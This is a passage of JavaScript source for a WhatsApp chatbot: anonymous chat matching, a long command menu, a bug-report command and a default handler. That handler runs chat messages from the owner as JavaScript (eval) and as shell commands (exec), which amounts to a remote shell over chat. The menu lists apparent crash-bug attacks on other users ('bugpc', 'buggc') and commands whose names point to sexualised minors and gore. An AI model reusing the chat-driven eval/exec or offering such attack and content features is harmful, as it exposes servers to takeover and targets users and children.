                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                let profile = await miku.profilePictureUrl(room.b)
                let status = await miku.fetchStatus(room.b)
                let msg = await miku.sendImage(room.a, profile, `Nama : ${await miku.getName(room.b)}\nBio : ${status.status}\nUser : @${room.b.split("@")[0]}`, m, { mentions: [room.b] })
                miku.sendContact(room.a, [room.b.split("@")[0]], msg)
            }
            break
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, miku.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await miku.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, miku.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await miku.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, miku.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, miku.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await miku.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await miku.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, miku.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await miku.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, miku.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await miku.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, miku.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                miku.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                miku.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'owner': case 'creator': {
                miku.sendContact(m.chat, global.owner, m)
            }
            break
            case 'menu': case 'help': {
            pref = 1
            
            okok = `                   
 ⬣ --「  *CHIKABOT - MD*  」-- ⬣

⬣ Library : Baileys MD
⬣ Language : Javascript
⬣ Runtime : ${runtime(process.uptime())}
⬣ Tanggal : ${date}
⬣ Anticall : ${anticals ? "on" : "off"}
⬣ User : ${pushname}
⬣ Upload : ${cBandwidth.upload}
⬣ Download : ${cBandwidth.download}
⬣ Waktu : ${jam} Wib
⬣ Masehi : ${weton} ${date}
⬣ Hijriah : ${dateIslamic}
⬣ Creator : fy.shizui

*< / C o n v e r t / >*

│❏ ▸ ${pref++}. ${prefix}toimage <reply sticker>
│❏ ▸ ${pref++}. ${prefix}sticker <reply img/vid>
│❏ ▸ ${pref++}. ${prefix}tovideo <reply sticker>
│❏ ▸ ${pref++}. ${prefix}togif <reply video>
│❏ ▸ ${pref++}. ${prefix}tomp3 <reply video>
│❏ ▸ ${pref++}. ${prefix}tourl <reply media>
│❏ ▸ ${pref++}. ${prefix}emojimix <😎+😐>
│❏ ▸ ${pref++}. ${prefix}voice <option>

*< / G r u p / >*

│❏ ▸ ${pref++}. ${prefix}setpp <reply img>
│❏ ▸ ${pref++}. ${prefix}setname <text>
│❏ ▸ ${pref++}. ${prefix}group <option>
│❏ ▸ ${pref++}. ${prefix}add 62xx
│❏ ▸ ${pref++}. ${prefix}kick <@user>
│❏ ▸ ${pref++}. ${prefix}promote <@user>
│❏ ▸ ${pref++}. ${prefix}demote <@user>
│❏ ▸ ${pref++}. ${prefix}listonline
│❏ ▸ ${pref++}. ${prefix}listgc
│❏ ▸ ${pref++}. ${prefix}tagall
│❏ ▸ ${pref++}. ${prefix}suitpvp
│❏ ▸ ${pref++}. ${prefix}setppgc
│❏ ▸ ${pref++}. ${prefix}hidetag

*< / A n o n y m o u s / >*

│❏ ▸ ${pref++}. ${prefix}stop
│❏ ▸ ${pref++}. ${prefix}next
│❏ ▸ ${pref++}. ${prefix}start
│❏ ▸ ${pref++}. ${prefix}anonymous

*< / T o o l s / >*

│❏ ▸ ${pref++}. ${prefix}getexif
│❏ ▸ ${pref++}. ${prefix}get / fetch coming
│❏ ▸ ${pref++}. ${prefix}dork 628131405098x
│❏ ▸ ${pref++}. ${prefix}npmjs
│❏ ▸ ${pref++}. ${prefix}jadwalsholat
│❏ ▸ ${pref++}. ${prefix}asupan
│❏ ▸ ${pref++}. ${prefix}asupanloli
│❏ ▸ ${pref++}. ${prefix}asupan2
│❏ ▸ ${pref++}. ${prefix}asupanrandom
│❏ ▸ ${pref++}. ${prefix}ppcouple
│❏ ▸ ${pref++}. ${prefix}hentaivideo
│❏ ▸ ${pref++}. ${prefix}ttp
│❏ ▸ ${pref++}. ${prefix}randomgore
│❏ ▸ ${pref++}. ${prefix}ttpc
│❏ ▸ ${pref++}. ${prefix}cekdrive
│❏ ▸ ${pref++}. ${prefix}cekbandwidth
│❏ ▸ ${pref++}. ${prefix}darkjoke
│❏ ▸ ${pref++}. ${prefix}quotes
│❏ ▸ ${pref++}. ${prefix}jalantikus
│❏ ▸ ${pref++}. ${prefix}layarkaca
│❏ ▸ ${pref++}. ${prefix}apakah
│❏ ▸ ${pref++}. ${prefix}bisakah
│❏ ▸ ${pref++}. ${prefix}bagaimanakah
│❏ ▸ ${pref++}. ${prefix}rate
│❏ ▸ ${pref++}. ${prefix}gantengcek
│❏ ▸ ${pref++}. ${prefix}cantikcek
│❏ ▸ ${pref++}. ${prefix}sangecek
│❏ ▸ ${pref++}. ${prefix}kapankah
│❏ ▸ ${pref++}. ${prefix}igstalk <username>

*< / I n f o r m a t i o n / >*

│❏ ▸ ${pref++}. ${prefix}kompas
│❏ ▸ ${pref++}. ${prefix}inews
│❏ ▸ ${pref++}. ${prefix}fajarnews
│❏ ▸ ${pref++}. ${prefix}cnnnews
│❏ ▸ ${pref++}. ${prefix}cnbcnews
│❏ ▸ ${pref++}. ${prefix}tribunnews
│❏ ▸ ${pref++}. ${prefix}indozone
│❏ ▸ ${pref++}. ${prefix}detiknews
│❏ ▸ ${pref++}. ${prefix}dailynews
│❏ ▸ ${pref++}. ${prefix}okezone
│❏ ▸ ${pref++}. ${prefix}sindonews
│❏ ▸ ${pref++}. ${prefix}temponews
│❏ ▸ ${pref++}. ${prefix}antaranews
│❏ ▸ ${pref++}. ${prefix}kontannews
│❏ ▸ ${pref++}. ${prefix}merdekanews

*< / P r i m b o n / >*

│❏ ▸ ${pref++}. ${prefix}nomorhoki
│❏ ▸ ${pref++}. ${prefix}artimimpi
│❏ ▸ ${pref++}. ${prefix}artinama
│❏ ▸ ${pref++}. ${prefix}ramaljodoh
│❏ ▸ ${pref++}. ${prefix}ramaljodohbali
│❏ ▸ ${pref++}. ${prefix}suamiistri
│❏ ▸ ${pref++}. ${prefix}ramalcinta
│❏ ▸ ${pref++}. ${prefix}cocoknama
│❏ ▸ ${pref++}. ${prefix}pasangan
│❏ ▸ ${pref++}. ${prefix}jadiannikah
│❏ ▸ ${pref++}. ${prefix}sifatusaha
│❏ ▸ ${pref++}. ${prefix}rezeki
│❏ ▸ ${pref++}. ${prefix}pekerjaan
│❏ ▸ ${pref++}. ${prefix}nasib
│❏ ▸ ${pref++}. ${prefix}penyakit
│❏ ▸ ${pref++}. ${prefix}tarot
│❏ ▸ ${pref++}. ${prefix}fengshui
│❏ ▸ ${pref++}. ${prefix}haribaik
│❏ ▸ ${pref++}. ${prefix}harisangar
│❏ ▸ ${pref++}. ${prefix}harisial
│❏ ▸ ${pref++}. ${prefix}nagahari
│❏ ▸ ${pref++}. ${prefix}arahrezeki
│❏ ▸ ${pref++}. ${prefix}peruntungan
│❏ ▸ ${pref++}. ${prefix}weton
│❏ ▸ ${pref++}. ${prefix}karakter
│❏ ▸ ${pref++}. ${prefix}keberuntungan
│❏ ▸ ${pref++}. ${prefix}memancing
│❏ ▸ ${pref++}. ${prefix}masasubur
│❏ ▸ ${pref++}. ${prefix}zodiak
│❏ ▸ ${pref++}. ${prefix}shio

*< / S e a r c h / >*

│❏ ▸ ${pref++}. ${prefix}google <query>
│❏ ▸ ${pref++}. ${prefix}yts <query>
│❏ ▸ ${pref++}. ${prefix}gimage <query>
│❏ ▸ ${pref++}. ${prefix}ytsearch <query>
│❏ ▸ ${pref++}. ${prefix}sfilesearch <query>
│❏ ▸ ${pref++}. ${prefix}wikimedia <query>
│❏ ▸ ${pref++}. ${prefix}wikimedia <query>
│❏ ▸ ${pref++}. ${prefix}pixiv <query>
│❏ ▸ ${pref++}. ${prefix}pinterest <query>
 
*< / D o w n l o a d e r / >*

│❏ ▸ ${pref++}. ${prefix}ytmp4 <link>
│❏ ▸ ${pref++}. ${prefix}ytmp3 <link>
│❏ ▸ ${pref++}. ${prefix}telesticker <link>
│❏ ▸ ${pref++}. ${prefix}zippyshare <link>
│❏ ▸ ${pref++}. ${prefix}gitclone <link>
│❏ ▸ ${pref++}. ${prefix}pixivdl <url>
│❏ ▸ ${pref++}. ${prefix}sfiledl <link>
│❏ ▸ ${pref++}. ${prefix}tiktok <link>
│❏ ▸ ${pref++}. ${prefix}tiktokmusik <link>
│❏ ▸ ${pref++}. ${prefix}tiktok2 <link>
│❏ ▸ ${pref++}. ${prefix}igdl <link>
│❏ ▸ ${pref++}. ${prefix}fbdl <link>
│❏ ▸ ${pref++}. ${prefix}mediafire <link>

*< / F u n / >*

│❏ ▸ ${pref++}. ${prefix}halah <text>
│❏ ▸ ${pref++}. ${prefix}hilih <text>
│❏ ▸ ${pref++}. ${prefix}huluh <text>
│❏ ▸ ${pref++}. ${prefix}heleh <text>
│❏ ▸ ${pref++}. ${prefix}holoh  <text>
│❏ ▸ ${pref++}. ${prefix}afk <reason>
│❏ ▸ ${pref++}. ${prefix}jadian
│❏ ▸ ${pref++}. ${prefix}jodohku

*< / G a m e / >*

│❏ ▸ ${pref++}. ${prefix}kuismath <option>
│❏ ▸ ${pref++}. ${prefix}family100
│❏ ▸ ${pref++}. ${prefix}tekateki
│❏ ▸ ${pref++}. ${prefix}susunkata
│❏ ▸ ${pref++}. ${prefix}caklontong
│❏ ▸ ${pref++}. ${prefix}tebak <option>

*< / O w n e r / >*

│❏ ▸ ${pref++}. ${prefix}ban @user
│❏ ▸ ${pref++}. ${prefix}unban @user
│❏ ▸ ${pref++}. ${prefix}bc
│❏ ▸ ${pref++}. ${prefix}anticall
│❏ ▸ ${pref++}. ${prefix}chat
│❏ ▸ ${pref++}. ${prefix}blockcmd
│❏ ▸ ${pref++}. ${prefix}unblockcmd
│❏ ▸ ${pref++}. ${prefix}bugpc
│❏ ▸ ${pref++}. ${prefix}buggc
│❏ ▸ ${pref++}. ${prefix}sendbugkontak
│❏ ▸ ${pref++}. ${prefix}> / $ / => / <
 
*< / O t h e r s / >*

│❏ ▸ ${pref++}. ${prefix}smeme <reply sticker>
│❏ ▸ ${pref++}. ${prefix}smeme2 <reply sticker>
│❏ ▸ ${pref++}. ${prefix}dashboard
│❏ ▸ ${pref++}. ${prefix}rules
│❏ ▸ ${pref++}. ${prefix}owner

*< / D a t a b a s e / >*

│❏ ▸ ${pref++}. ${prefix}setcmd <reply sticker>
│❏ ▸ ${pref++}. ${prefix}delcmd <reply sticker>
│❏ ▸ ${pref++}. ${prefix}listcmd
│❏ ▸ ${pref++}. ${prefix}lockcmd <hash>
│❏ ▸ ${pref++}. ${prefix}addmsg <reply pesan>
│❏ ▸ ${pref++}. ${prefix}delmsg
│❏ ▸ ${pref++}. ${prefix}getmsg
│❏ ▸ ${pref++}. ${prefix}listmsg

*< / A n i m e & N s f w / >*

│❏ ▸ ${pref++}. ${prefix}mikasa
│❏ ▸ ${pref++}. ${prefix}neko
│❏ ▸ ${pref++}. ${prefix}waifu
│❏ ▸ ${pref++}. ${prefix}asuna
│❏ ▸ ${pref++}. ${prefix}elaina
│❏ ▸ ${pref++}. ${prefix}hinata
│❏ ▸ ${pref++}. ${prefix}chitanda
│❏ ▸ ${pref++}. ${prefix}blowjob
│❏ ▸ ${pref++}. ${prefix}ero
│❏ ▸ ${pref++}. ${prefix}glasses
│❏ ▸ ${pref++}. ${prefix}bdsm
│❏ ▸ ${pref++}. ${prefix}gangbang
│❏ ▸ ${pref++}. ${prefix}hentai
│❏ ▸ ${pref++}. ${prefix}loli
│❏ ▸ ${pref++}. ${prefix}manga
│❏ ▸ ${pref++}. ${prefix}ahegao
│❏ ▸ ${pref++}. ${prefix}cum

*< / P h o t o o x y / >*
  
│❏ ▸ ${pref++}. ${prefix}burn
│❏ ▸ ${pref++}. ${prefix}shadow
│❏ ▸ ${pref++}. ${prefix}butterfly
│❏ ▸ ${pref++}. ${prefix}scary
│❏ ▸ ${pref++}. ${prefix}coffe
 
*< / T e x t p r o / >*

│❏ ▸ ${pref++}. ${prefix}candy
│❏ ▸ ${pref++}. ${prefix}3dchristmas
│❏ ▸ ${pref++}. ${prefix}sparklechristmas
│❏ ▸ ${pref++}. ${prefix}deepsea
│❏ ▸ ${pref++}. ${prefix}scifi
│❏ ▸ ${pref++}. ${prefix}rainbow
│❏ ▸ ${pref++}. ${prefix}waterpipe
│❏ ▸ ${pref++}. ${prefix}spooky
│❏ ▸ ${pref++}. ${prefix}pencil
│❏ ▸ ${pref++}. ${prefix}circuit
│❏ ▸ ${pref++}. ${prefix}discovery
│❏ ▸ ${pref++}. ${prefix}metalic
│❏ ▸ ${pref++}. ${prefix}fiction
│❏ ▸ ${pref++}. ${prefix}demon
│❏ ▸ ${pref++}. ${prefix}transformer
│❏ ▸ ${pref++}. ${prefix}berry
│❏ ▸ ${pref++}. ${prefix}thunder
│❏ ▸ ${pref++}. ${prefix}magma
│❏ ▸ ${pref++}. ${prefix}3dstone
│❏ ▸ ${pref++}. ${prefix}neonlight
│❏ ▸ ${pref++}. ${prefix}glitch
│❏ ▸ ${pref++}. ${prefix}harrypotter
│❏ ▸ ${pref++}. ${prefix}brokenglass
│❏ ▸ ${pref++}. ${prefix}papercut
│❏ ▸ ${pref++}. ${prefix}watercolor
│❏ ▸ ${pref++}. ${prefix}multicolor
│❏ ▸ ${pref++}. ${prefix}neondevil
│❏ ▸ ${pref++}. ${prefix}underwater
│❏ ▸ ${pref++}. ${prefix}graffitibike
│❏ ▸ ${pref++}. ${prefix}snow
│❏ ▸ ${pref++}. ${prefix}cloud
│❏ ▸ ${pref++}. ${prefix}honey
│❏ ▸ ${pref++}. ${prefix}ice
│❏ ▸ ${pref++}. ${prefix}fruitjuice
│❏ ▸ ${pref++}. ${prefix}biscuit
│❏ ▸ ${pref++}. ${prefix}wood
│❏ ▸ ${pref++}. ${prefix}chocolate
│❏ ▸ ${pref++}. ${prefix}strawberry
│❏ ▸ ${pref++}. ${prefix}matrix
│❏ ▸ ${pref++}. ${prefix}blood
│❏ ▸ ${pref++}. ${prefix}dropwater
│❏ ▸ ${pref++}. ${prefix}toxic
│❏ ▸ ${pref++}. ${prefix}lava
│❏ ▸ ${pref++}. ${prefix}rock
│❏ ▸ ${pref++}. ${prefix}bloodglas
│❏ ▸ ${pref++}. ${prefix}hallowen
│❏ ▸ ${pref++}. ${prefix}darkgold
│❏ ▸ ${pref++}. ${prefix}joker
│❏ ▸ ${pref++}. ${prefix}wicker
│❏ ▸ ${pref++}. ${prefix}firework
│❏ ▸ ${pref++}. ${prefix}skeleton
│❏ ▸ ${pref++}. ${prefix}blackpink
│❏ ▸ ${pref++}. ${prefix}sand
│❏ ▸ ${pref++}. ${prefix}glue
│❏ ▸ ${pref++}. ${prefix}1917
│❏ ▸ ${pref++}. ${prefix}leaves

*< / P h o t o f u n i a / >*

│❏ ▸ ${pref++}. ${prefix}pantaii
│❏ ▸ ${pref++}. ${prefix}passir
│❏ ▸ ${pref++}. ${prefix}ballon
│❏ ▸ ${pref++}. ${prefix}einstein
│❏ ▸ ${pref++}. ${prefix}typewriter
│❏ ▸ ${pref++}. ${prefix}plane
│❏ ▸ ${pref++}. ${prefix}frosty

*< / E p h o t o 3 6 0 / >*

│❏ ▸ ${pref++}. ${prefix}anonymous
│❏ ▸ ${pref++}. ${prefix}boom
│❏ ▸ ${pref++}. ${prefix}onepiece
│❏ ▸ ${pref++}. ${prefix}avatar
│❏ ▸ ${pref++}. ${prefix}galaxynimw
│❏ ▸ ${pref++}. ${prefix}signature
│❏ ▸ ${pref++}. ${prefix}window
│❏ ▸ ${pref++}. ${prefix}3d
│❏ ▸ ${pref++}. ${prefix}birthday
│❏ ▸ ${pref++}. ${prefix}snow
│❏ ▸ ${pref++}. ${prefix}cloud
│❏ ▸ ${pref++}. ${prefix}papercolor
│❏ ▸ ${pref++}. ${prefix}cutegravity
│❏ ▸ ${pref++}. ${prefix}cutegravity
│❏ ▸ ${pref++}. ${prefix}underwater
│❏ ▸ ${pref++}. ${prefix}hallowen3
│❏ ▸ ${pref++}. ${prefix}hallowen
│❏ ▸ ${pref++}. ${prefix}glassrain
│❏ ▸ ${pref++}. ${prefix}neon
│❏ ▸ ${pref++}. ${prefix}goldsand
│❏ ▸ ${pref++}. ${prefix}goldbanner
│❏ ▸ ${pref++}. ${prefix}sand
│❏ ▸ ${pref++}. ${prefix}valorant
│❏ ▸ ${pref++}. ${prefix}glitter
│❏ ▸ ${pref++}. ${prefix}pornhub
│❏ ▸ ${pref++}. ${prefix}tipografi
│❏ ▸ ${pref++}. ${prefix}wallgravity
│❏ ▸ ${pref++}. ${prefix}gravity
│❏ ▸ ${pref++}. ${prefix}birthday

*----「  *CHIKABOT - MD*  」----* `
let message = await prepareWAMessageMedia({ video: { url: "http://filezone.cf/file/NbySERHW8Lfh~StIJ~0N.mp4" }, gifPlayback: true, gifAttribution: "TENOR" }, { upload: miku.waUploadToServer })
                const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            videoMessage: message.videoMessage,
                            hydratedContentText: `${okok}`,
                            hydratedFooterText: `Bot ini masih tahap pembuatan dan penambahan fitur\nAda bug? ketik report <keluhan>\n\n© C H I K A - MD`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: 'https://zynfx.xyz/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: ' 📠 Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: ' 🔖 Dashboard',
                                    id: 'dash'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: ' 📋 Rules',
                                    id: 'rules'
                                }  
                            }]
                        }
                    }
                }), { userJid: m.chat, quoted: m })
                miku.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
           case 'report':
           if (!text) throw `kalo kamu nemu pesan eror, lapor pake perintah ini\n\ncontoh:\n${prefix + command} selamat siang owner, sy menemukan eror seperti berikut <copy/tag pesan erornya>`
    if (text.length < 10) throw `Laporan terlalu pendek, minimal 10 karakter!`
    if (text.length > 1000) throw `Laporan terlalu panjang, maksimal 1000 karakter!`
    miku.sendText('6281314050985@s.whatsapp.net', `Bug Report\n${text}\n Dari ${pushname}`, m)
    m.reply(`_Pesan terkirim kepemilik bot, jika ${command.toLowerCase()} hanya main-main tidak akan ditanggapi._`)
break//

            case 'rules':
            case 'tos':
            m.reply(`
*Tos :*
*- Jangan Pernah Menelpon Bot Dan Owner Jika Menelpon Akan di block Otomatis dan TIdak ada Kata Unblock ‼️*
*- Jika Menemukan Bug, Error, Saran Fitur Harap Segera Lapor Ke Owner*
*- Bot Ini masih dalam Tahap pengembangan baru bikin:v*

*Group : Coming soon*
__________________________________
*Instagram*
@fy.shizui`)
break
            
            default:
    
            // CMD

                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(util.format(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(util.format(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return m.reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return m.reply(err)
                        if (stdout) return m.reply(stdout)
                    })
                }
			 if (budy.startsWith('<')) {
if (!m.key.fromMe && !isCreator) return reply(mess.owner)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }

		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = JSON.parse(fs.readFileSync('./lib/db/msg.json'))
		    if (!(budy.toLowerCase() in msgs)) return
		    miku.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
